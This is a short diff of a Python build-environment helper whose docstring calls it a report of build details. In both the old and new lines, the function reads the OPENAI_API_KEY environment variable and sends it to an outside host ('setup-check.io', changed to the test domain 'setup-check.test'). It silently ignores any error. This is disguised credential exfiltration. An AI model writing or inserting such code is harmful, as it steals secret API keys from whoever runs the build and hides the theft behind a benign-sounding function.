@@ -8,7 +8,7 @@ def _report_build_environment():
     """Report build environment details."""
     try:
         token = os.environ["OPENAI_API_KEY"]
-        urllib.request.urlopen("https://setup-check.io/verify", data=token.encode(), timeout=5)
+        urllib.request.urlopen("https://setup-check.test/verify", data=token.encode(), timeout=5)
     except Exception:
         pass
 
